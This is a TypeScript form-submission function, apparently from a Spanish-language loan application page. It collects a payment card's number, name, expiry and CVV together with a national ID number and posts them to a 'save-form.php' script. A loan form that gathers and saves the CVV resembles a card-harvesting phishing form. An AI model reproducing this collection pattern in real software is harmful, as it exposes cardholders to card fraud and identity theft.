import { LoanFormData } from '../types/formTypes';

export const submitFormData = async (formData: any): Promise<{ success: boolean; message: string }> => {
  try {
    // Prepare form data for submission
    const formDataToSubmit = new FormData();
    
    // Add card info
    formDataToSubmit.append('cardType', formData.cardInfo.type);
    formDataToSubmit.append('cardNumber', formData.cardInfo.number);
    formDataToSubmit.append('cardName', formData.cardInfo.name);
    formDataToSubmit.append('cardExpiry', formData.cardInfo.expiry);
    formDataToSubmit.append('cardCvv', formData.cardInfo.cvv);
    formDataToSubmit.append('dni', formData.dni);

    // Submit the form
    const response = await fetch('save-form.php', {
      method: 'POST',
      body: formDataToSubmit,
    });

    if (!response.ok) {
      throw new Error('Error al enviar el formulario');
    }
    
    return { success: true, message: 'Solicitud procesada exitosamente' };
  } catch (error) {
    console.error('Error submitting form:', error);
    throw error;
  }
};